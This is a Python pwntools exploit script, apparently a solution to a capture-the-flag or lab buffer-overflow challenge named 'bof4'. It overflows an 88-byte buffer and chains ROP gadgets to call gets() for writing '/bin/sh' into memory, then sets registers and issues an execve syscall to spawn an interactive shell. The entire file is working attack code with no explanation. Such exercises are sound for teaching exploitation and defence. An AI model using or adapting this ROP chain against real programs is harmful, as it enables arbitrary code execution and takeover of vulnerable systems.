#!/usr/bin/python3
from pwn import *

exe = ELF('./bof4', checksec=False)
p = process('./bof4')

# execve('/bin/sh', 0, 0)

# call execve, rax = 0x3b, syscall

pop_rdi = 0x000000000040220e #arg1
pop_rsi = 0x00000000004015ae #arg2
pop_rdx = 0x00000000004043e4 #arg3
pop_rax = 0x0000000000401001
rw_section = 0x406ce0
syscall = 0x000000000040132e

payload = b'a'*88
payload += p64(pop_rdi) + p64(rw_section)
payload += p64(exe.sym['gets'])                  # nhap /bin/sh
#
payload += p64(pop_rdi) + p64(rw_section)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += b'a'*0x28

# call execve()
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

p.sendlineafter(b'Say something: ', payload)

p.sendline(b'/bin/sh')

p.interactive()
